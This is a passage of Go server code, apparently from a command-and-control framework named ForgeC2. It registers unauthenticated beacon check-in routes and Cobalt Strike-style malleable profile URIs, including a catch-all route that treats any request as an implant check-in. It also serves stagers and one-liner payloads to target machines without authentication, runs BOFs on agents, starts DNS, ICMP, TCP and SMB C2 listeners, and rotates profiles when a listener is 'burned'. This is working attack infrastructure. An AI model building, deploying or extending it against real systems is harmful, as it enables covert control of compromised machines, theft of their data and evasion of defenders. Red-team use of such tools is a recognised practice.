		// 鈹€鈹€ Audit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auditRead := auth.Group("/")
		auditRead.Use(middleware.RequirePermission(db.PermAuditRead))
		{
			auditRead.GET("/audit", s.handleAuditLogPage)
			auditRead.GET("/audit/logs", s.handleGetAuditLogs)
		}

		// 鈹€鈹€ Settings 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		settingsRead := auth.Group("/")
		settingsRead.Use(middleware.RequirePermission(db.PermSettingsRead))
		{
			settingsRead.GET("/settings", s.handleSettingsPage)
		}
		settingsWrite := auth.Group("/")
		settingsWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
		{
			settingsWrite.POST("/settings/password", s.handleChangePassword)
			settingsWrite.POST("/settings/agent", s.handleSaveAgentConfig)
			settingsWrite.POST("/settings/server", s.handleSaveServerConfig)
			settingsWrite.POST("/settings/malleable", s.handleSaveMalleableProfile)
			settingsWrite.POST("/settings/purge/tasks", s.handlePurgeTasks)
			settingsWrite.POST("/settings/purge/audit", s.handlePurgeAuditLogs)
			settingsWrite.POST("/settings/jwt/regenerate", s.handleRegenerateJWT)
			settingsWrite.POST("/settings/db/vacuum", s.handleDBVacuum)
			settingsWrite.POST("/settings/db/backup", s.handleBackupDatabase)
			settingsWrite.GET("/settings/config/download", s.handleDownloadConfig)


		}

		// 鈹€鈹€ 2FA / TOTP 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/settings/totp/status", s.handleTOTPStatus)
		auth.POST("/settings/totp/generate", s.handleTOTPGenerate)
		auth.POST("/settings/totp/enable", s.handleTOTPEnable)
		auth.POST("/settings/totp/disable", s.handleTOTPDisable)

		// 鈹€鈹€ i18n / Translations 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/translations", s.handleTranslationsPage)
		auth.GET("/api/translations", s.handleGetTranslations)
		auth.GET("/api/translations/stats", s.handleTranslationStats)
		auth.GET("/api/translations/check", s.handleTranslationCheck)

		// 鈹€鈹€ API Documentation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/docs", s.handleDocsPage)
		auth.GET("/api/docs", s.handleAPIDocsRedirect)
		auth.GET("/api/docs/", s.handleAPIDocs)
		auth.GET("/api/docs/openapi.yaml", s.handleAPIDocsYAML)

		// 鈹€鈹€ AI Assistant 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/ai", s.handleAIPage)
		auth.POST("/ai/chat", s.handleAIChat)
		auth.POST("/ai/config", s.handleAIConfig)

		// 鈹€鈹€ WebSocket 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/ws", s.handleWebSocket)
		auth.GET("/ws/beacon", s.handleWebSocketBeacon)

		// 鈹€鈹€ Tokens 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/tokens", s.handleGlobalTokensPage)

		// 鈹€鈹€ User Management 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		usersRead := auth.Group("/")
		usersRead.Use(middleware.RequirePermission(db.PermUsersRead))
		{
			usersRead.GET("/users", s.handleUsersPage)
		}
		usersWrite := auth.Group("/")
		usersWrite.Use(middleware.RequirePermission(db.PermUsersWrite))
		{
			usersWrite.POST("/users/add", s.handleAddUser)
			usersWrite.POST("/users/:id/edit", s.handleEditUser)
			usersWrite.POST("/users/:id/toggle", s.handleToggleUser)
			usersWrite.POST("/users/:id/password", s.handleSetUserPassword)
			usersWrite.POST("/users/:id/kick", s.handleKickUser)
			usersWrite.POST("/users/:id/force-logout", s.handleForceLogoutUser)
		}
		usersDelete := auth.Group("/")
		usersDelete.Use(middleware.RequirePermission(db.PermUsersDelete))
		{
			usersDelete.DELETE("/users/:id", s.handleDeleteUser)
		}

		// 鈹€鈹€ SOCKS Sessions 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
		auth.GET("/socks/sessions", s.handleGetSocksSessions)

		// Scripting Console
		auth.GET("/scripting", s.handleScriptingPage)
		auth.GET("/api/scripts", s.handleAPIGetScripts)
		auth.POST("/api/scripts", s.handleAPISaveScript)
		auth.DELETE("/api/scripts/:id", s.handleAPIDeleteScript)
		auth.POST("/api/scripts/execute", s.handleAPIExecuteScript)
		auth.GET("/api/scripts/history", s.handleAPIScriptsHistory)
	}

	// Agent Beacon API (no auth — agents check in unauthenticated)
	beaconAPI := s.router.Group("/api/v1")
	beaconAPI.Use(s.rateLimiter.Limit())
	beaconAPI.Use(s.trafficMiddleware())
	{
		beaconAPI.POST("/beacon", s.handleBeacon)
		beaconAPI.POST("/screen_frame", s.handleScreenFrame)

		// Malleable profile support (similar to Cobalt Strike)
		beaconAPI.POST("/generate_204", s.handleBeacon)
		beaconAPI.POST("/th", s.handleBeacon)
		beaconAPI.GET("/generate_204", s.handleBeacon)
		beaconAPI.GET("/th", s.handleBeacon)
	}

	// Protected REST API (authentication required)
	restAPI := s.router.Group("/api/v1")
	restAPI.Use(middleware.AuthRequired(s.db))
	restAPI.Use(s.apiRateLimiter.LimitByUser())
	{
		s.registerAPIRoutes(restAPI)
	}

	// Root-level malleable profile routes (agent beacon_uri does NOT include /api/v1/ prefix)
	s.router.POST("/generate_204", s.handleBeacon)
	s.router.GET("/generate_204", s.handleBeacon)

	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
	s.router.GET("/th", s.handleBeacon)
	s.router.POST("/th", s.handleBeacon)
	s.router.NoRoute(func(c *gin.Context) {
		// Treat unmatched GET/POST as potential beacon check-in for custom profile URIs
		if c.Request.Method == "POST" || c.Request.Method == "GET" {
			s.handleBeacon(c)
			return
		}
		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
	})

	// External C2 (redirector-facing, no auth)
	extc2 := s.router.Group("/extc2/v1")
	{
		extc2.POST("/receive", s.handleExtC2Receive)
		extc2.POST("/send", s.handleExtC2Send)
	}

	// Build logs
	auth.GET("/builds", s.handleBuildLogs)

	// Traffic monitor
	auth.GET("/traffic", s.handleTrafficPage)
	auth.GET("/api/traffic", s.handleTrafficData)

	// Monitor / Alert API
	auth.GET("/api/monitor/metrics", s.handleGetSystemMetrics)
	auth.GET("/api/monitor/metrics/history", s.handleGetMetricsHistory)
	auth.GET("/api/monitor/alerts", s.handleGetAlerts)
	auth.GET("/api/monitor/alerts/stats", s.handleGetAlertStats)
	auth.GET("/api/monitor/alert-rules", s.handleGetAlertRules)
	auth.POST("/api/monitor/alert-rules", s.handleCreateAlertRule)
	auth.PUT("/api/monitor/alert-rules/:id", s.handleUpdateAlertRule)
	auth.DELETE("/api/monitor/alert-rules/:id", s.handleDeleteAlertRule)
	auth.POST("/api/monitor/alerts/:id/acknowledge", s.handleAcknowledgeAlert)
	auth.POST("/api/monitor/alerts/:id/resolve", s.handleResolveAlert)
	auth.GET("/api/monitor/agent-status", s.handleGetAgentStatus)

		// ── OPSEC Guard ────────────────────────────────────────────────────
		auth.POST("/api/opsec/check", s.handleOpsecCheck)
		auth.GET("/api/opsec/rules", s.handleOpsecRules)

		// ── Circuit Breaker ─────────────────────────────────────────────────
		auth.GET("/api/circuit-breaker/status", s.handleCircuitBreakerStatus)

		// ── Profile Rotation ────────────────────────────────────────────────
		auth.POST("/api/agents/:id/profile-rotate", s.handleProfileRotate)

	// Dashboard charts API
	auth.GET("/api/dashboard/activity-heatmap", s.handleDashboardActivityHeatmap)
	auth.GET("/api/dashboard/os-distribution", s.handleDashboardOSDistribution)
	auth.GET("/api/dashboard/task-status", s.handleDashboardTaskStatus)
	auth.GET("/api/dashboard/listener-traffic", s.handleDashboardListenerTraffic)
	auth.GET("/api/dashboard/credential-types", s.handleDashboardCredentialTypes)
	auth.GET("/api/dashboard/agent-geo", s.handleDashboardAgentGeo)
	auth.GET("/api/dashboard/task-gantt", s.handleDashboardTaskGantt)
	auth.GET("/api/dashboard/attack-path", s.handleDashboardAttackPath)

	// 鉂€ BOF Management 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
	auth.GET("/bof", s.handleBOFPage)
	auth.POST("/api/bof/upload", s.handleBOFUpload)
	auth.GET("/api/bof/list", s.handleBOFList)
	auth.GET("/api/bof/:id/download", s.handleBOFDownload)
	auth.POST("/api/bof/:id/run", s.handleBOFRun)
	auth.POST("/api/bof/:id/edit", s.handleBOFEdit)
	auth.DELETE("/api/bof/:id", s.handleBOFDelete)
	auth.GET("/api/bof/results", s.handleBOFRecentResults)
	// Quick BOF execution from agent shell page (upload + run in one step)
	auth.POST("/agents/:id/bof/quick", s.handleBOFQuickRun)

	// Version update check & hot-update
	auth.GET("/api/update-check", s.handleUpdateCheck)
	auth.GET("/api/update-check/version", s.handleCheckVersion)
	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)

	// Stage serving for Artifact Kit (no auth -- stagers are unauthenticated)
	s.router.GET("/stage/:xorKey", s.handleServeStage)

	// One-Liner payload hosting (no auth -- target machines download these)
	s.router.GET("/payloads/:id/:filename", s.handleServePayload)

	// Screenshot serving (protected)
	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
}

// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	session := UserSession{Username: username, ConnectedAt: time.Now()}

	s.wsMutex.Lock()
	s.wsClients[conn] = session
	s.wsMutex.Unlock()

	slog.Info("WebSocket client connected", "user", username)
	s.broadcastUserEvent("user_online", username, session)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("WebSocket reader panicked", "user", username, "recover", r)
			}
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			s.broadcastUserEvent("user_offline", username, session)
			conn.Close()
			slog.Info("WebSocket client disconnected", "user", username)
		}()

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			default:
			conn.SetReadDeadline(time.Now().Add(60 * time.Second))
			_, _, err := conn.ReadMessage()
			if err != nil {
				return
			}
			}
		}
	}()
}

// UserSession holds metadata about a connected operator WebSocket session.
type UserSession struct {
	Username    string    `json:"username"`
	ConnectedAt time.Time `json:"connected_at"`
}

// getOnlineUsers returns the list of currently connected operator sessions.
func (s *Server) getOnlineUsers() []UserSession {
	s.wsMutex.Lock()
	defer s.wsMutex.Unlock()
	users := make([]UserSession, 0, len(s.wsClients))
	seen := make(map[string]bool)
	for _, session := range s.wsClients {
		if !seen[session.Username] {
			seen[session.Username] = true
			users = append(users, session)
		}
	}
	return users
}

// broadcastUserEvent sends a user online/offline event to all WebSocket clients.
func (s *Server) broadcastUserEvent(eventType, username string, session UserSession) {
	msg, _ := json.Marshal(map[string]interface{}{
		"type":         eventType,
		"username":     username,
		"connected_at": session.ConnectedAt,
		"online_users": s.getOnlineUsers(),
	})
	s.broadcastToClients(msg)
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Iterates over a snapshot of the map to avoid holding the lock during writes.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.Lock()
	clients := make([]*websocket.Conn, 0, len(s.wsClients))
	for conn := range s.wsClients {
		clients = append(clients, conn)
	}
	s.wsMutex.Unlock()

	for _, conn := range clients {
		select {
		case <-s.ctx.Done():
			return
		default:
		}
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := conn.WriteMessage(websocket.TextMessage, message); err != nil {
			if s.ctx.Err() != nil {
				return
			}
			slog.Debug("Failed to send WebSocket message", "err", err)
			s.wsMutex.Lock()
			conn.Close()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
		}
	}
}

// broadcastAgentOnline pushes agent online events to all WebSocket clients.
func (s *Server) broadcastAgentOnline(agent db.Implant, isNew bool) {
	payload := map[string]interface{}{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
		"new":      isNew,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent online notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentOffline pushes agent offline events to all WebSocket clients.
func (s *Server) broadcastAgentOffline(agent db.Implant) {
	payload := map[string]string{
		"type":     "agent_offline",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent offline notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentDataUpdate pushes agent data changes to all WebSocket clients.
func (s *Server) broadcastAgentDataUpdate(agentID string, data map[string]interface{}) {
	payload := map[string]interface{}{
		"type":     "agent_data_update",
		"agent_id": agentID,
		"data":     data,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent data update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":       "task_update",
		"agent_id":   agentID,
		"task_id":    task.ID,
		"task_type":  task.Type,
		"status":     task.Status,
		"command":    task.Command,
		"created_by": task.CreatedBy,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	s.cleanupGhostAgents()

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	slog.Info("old data cleanup completed")
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = 60
	}
	return time.Duration(d) * time.Second
}

// AgentStatusInfo holds display info for an agent's status
type AgentStatusInfo struct {
	Status    string // "online", "stale", "offline"
	Label     string // "Online", "Timeout", "Offline"
	DotColor  string // tailwind bg class
	BgColor   string // tailwind bg class
	TextColor string // tailwind text class
	Anim      string // animate-pulse or empty
}

func (s *Server) agentStatus(a db.Implant) AgentStatusInfo {
	since := time.Since(a.LastSeen)
	threshold := s.offlineThreshold()
	switch {
	case since < threshold:
		return AgentStatusInfo{"online", "Online", "bg-emerald-500", "bg-emerald-50", "text-emerald-700", "animate-pulse"}
	case since < 30*time.Minute:
		return AgentStatusInfo{"stale", "Timeout", "bg-amber-500", "bg-amber-50", "text-amber-700", ""}
	default:
		return AgentStatusInfo{"offline", "Offline", "bg-red-500", "bg-red-50", "text-red-700", ""}
	}
}

// cleanupGhostAgents removes invalid or long-dead implant records.
func (s *Server) cleanupGhostAgents() {
	ghostCutoff := time.Now().Add(-1 * time.Hour)
	var ghosts []db.Implant
	if err := s.db.Where("(hostname = '' OR hostname IS NULL) AND (ip = '' OR ip IS NULL) AND last_seen < ?", ghostCutoff).Find(&ghosts).Error; err != nil {
		return
	}
	for _, agent := range ghosts {
		if err := s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{}).Error; err != nil {
			slog.Error("Failed to delete ghost agent tasks", "agent_id", agent.ID, "error", err)
		}
		if err := s.db.Delete(&agent).Error; err == nil {
			slog.Info("Removed ghost agent", "id", agent.ID, "last_seen", agent.LastSeen)
		}
	}

	offlineCutoff := time.Now().AddDate(0, 0, -30)
	var stale []db.Implant
	if err := s.db.Where("last_seen < ?", offlineCutoff).Find(&stale).Error; err != nil {
		return
	}
	for _, agent := range stale {
		s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{})
		if err := s.db.Delete(&agent).Error; err == nil {
			slog.Info("Removed stale offline agent", "id", agent.ID, "hostname", agent.Hostname, "last_seen", agent.LastSeen)
		}
	}
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff) // recurse into agent subdirs
			// optionally remove empty dirs
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(path)
		}
	}
}

func (s *Server) Shutdown() {
	slog.Info("Shutting down server...")
	s.extraListenersMu.Lock()
	for key, srv := range s.extraListeners {
		slog.Info("Shutting down extra listener", "key", key)
		srv.Close()
	}
	clear(s.extraListeners)
	s.extraListenersMu.Unlock()
	if s.ctxCancel != nil {
		s.ctxCancel()
	}
	s.wg.Wait()
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()
	go s.cleanupStaleSocks()
	go s.periodicRPortFwdCleanup()

	// Initialize Circuit Breaker
	cb := NewCircuitBreaker(s.cfg)
	cb.SetOnBurnedHandler(func(targetID string) {
		slog.Warn("Circuit breaker triggered: listener BURNED", "listener_id", targetID)
		// Automatically push profile rotation to agents on this listener
		s.rotateAgentsOnBurnedListener(targetID)
	})
	cb.Start()

	// start update checker
	s.initUpdateChecker()

	// periodic cleanup of hosted one-liner payloads
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("Payload cleanup panicked", "recover", r)
			}
		}()
		for {
			time.Sleep(30 * time.Minute)
			s.cleanupOldPayloads()
		}
	}()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		go s.startTCPListener()
	}
	if s.cfg.Server.SMBEnabled && s.cfg.Server.SMBPipe != "" {
		go s.startSMBListener()
	}

	// Start ICMP C2 listener if enabled
	if s.cfg.Server.ICMPEnabled {
		il := NewICMPBeaconListener(s.cfg.Server.ICMPAddr)
		il.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("ICMP beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		if err := il.Start(); err != nil {
			slog.Error("Failed to start ICMP listener", "err", err)
		}
		s.icmpListener = il
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0)
		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("DNS beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		s.dnsListener = dl
		go dl.Start()
	}

	// Start extra listeners from DB (created via the UI in previous sessions)
	s.startExtraListenersFromDB()

	// Check main server port availability before attempting to bind
	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	if !isPortAvailable(s.cfg.Server.Host, s.cfg.Server.Port) {
		return fmt.Errorf("port %s is already in use — check for another server instance or change server.port in config.yaml", addr)
	}

	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:         addr,
			Handler:      s.router,
			TLSConfig:    tlsCfg,
			ReadTimeout:  30 * time.Second,  // Prevent slow client attacks
			WriteTimeout: 60 * time.Second,  // Prevent slow response attacks
			IdleTimeout:  120 * time.Second, // Keep-alive connections
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

// startExtraListenersFromDB starts extra listeners for all enabled listeners
// stored in the database. Called at server startup.
func (s *Server) startExtraListenersFromDB() {
	var listeners []db.Listener
	// Load all enabled listeners (DNS/ICMP are loaded from DB too now)
	if err := s.db.Find(&listeners, "enabled = ?", true).Error; err != nil {
		slog.Error("Failed to load listeners from DB", "err", err)
		return
	}
	for _, l := range listeners {
		scheme := l.Scheme
		if scheme == "" {
			scheme = l.Type
		}
		addr := l.Host + ":" + itoa(l.Port)
		key := scheme + "://" + addr

		// Skip if this is the main server address (already served)
		mainAddr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
		if addr == mainAddr {
			slog.Debug("Skipping extra listener — matches main server address", "key", key)
			continue
		}

		// Check port availability before starting (skip for DNS/ICMP which may not use TCP port)
		needsPort := scheme != "dns" && scheme != "icmp"
		if needsPort && !isPortAvailable(l.Host, l.Port) {
			slog.Warn("Port not available for extra listener, skipping", "key", key, "addr", addr)
			continue
		}

		slog.Info("Restoring extra listener from DB", "key", key, "addr", addr)
		if err := s.startExtraListener(key, addr, scheme); err != nil {
			slog.Error("Failed to start extra listener from DB", "key", key, "err", err)
		}
	}
}

// startExtraListener starts an additional listener on the given addr.
func (s *Server) startExtraListener(key, addr, scheme string) error {
	switch scheme {
	case "http", "https":
		return s.startExtraHTTPListener(key, addr, scheme)
	case "tcp", "tls":
		return s.startExtraTCPListener(key, addr, scheme)
	case "dns", "icmp":
		// DNS/ICMP listeners are currently configured via config.yaml, not per-listener in DB.
		// Future work: support starting DNS/ICMP listeners per DB record.
		slog.Warn("DNS/ICMP listeners from DB not yet supported, skipping", "scheme", scheme, "key", key)
		return nil
	default:
		slog.Warn("Unknown extra listener scheme, skipping", "scheme", scheme, "key", key)
		return nil
	}
}

func (s *Server) startExtraHTTPListener(key, addr, scheme string) error {
	srv := &http.Server{
		Addr:         addr,
		Handler:      s.router,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	s.extraListenersMu.Lock()
	s.extraListeners[key] = srv
	s.extraListenersMu.Unlock()
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		var err error
		if scheme == "https" {
			slog.Info("Extra HTTPS listener started", "addr", addr, "key", key)
			err = srv.ListenAndServeTLS(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		} else {
			slog.Info("Extra HTTP listener started", "addr", addr, "key", key)
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			slog.Error("Extra HTTP listener error", "key", key, "addr", addr, "err", err)
		}
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraTCPListener(key, addr, scheme string) error {
	var ln net.Listener
	var err error
	if scheme == "tls" {
		cert, certErr := tls.LoadX509KeyPair(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		if certErr != nil {
			return fmt.Errorf("loading TLS cert for extra TCP listener: %w", certErr)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		ln, err = tls.Listen("tcp", addr, tlsCfg)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("starting extra TCP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = ln
	s.extraListenersMu.Unlock()

	slog.Info("Extra TCP listener started", "addr", addr, "key", key, "tls", scheme == "tls")
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		for {
			conn, aErr := ln.Accept()
			if aErr != nil {
				break
			}
			go s.handleTCPConnection(conn)
		}
		ln.Close()
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

// stopExtraListener gracefully stops an extra listener by key.
func (s *Server) stopExtraListener(key string) error {
	s.extraListenersMu.Lock()
	closer, ok := s.extraListeners[key]
	delete(s.extraListeners, key)
	s.extraListenersMu.Unlock()
	if !ok {
		return nil
	}
	return closer.Close()
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(24 * time.Hour)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupOldData()
		}
	}
}

func (s *Server) periodicRPortFwdCleanup() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupStaleRPortFwd()
		}
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}

// isPortAvailable checks whether the given host:port can be listened on.
func isPortAvailable(host string, port int) bool {
	addr := host + ":" + itoa(port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return false
	}
	ln.Close()
	return true
}

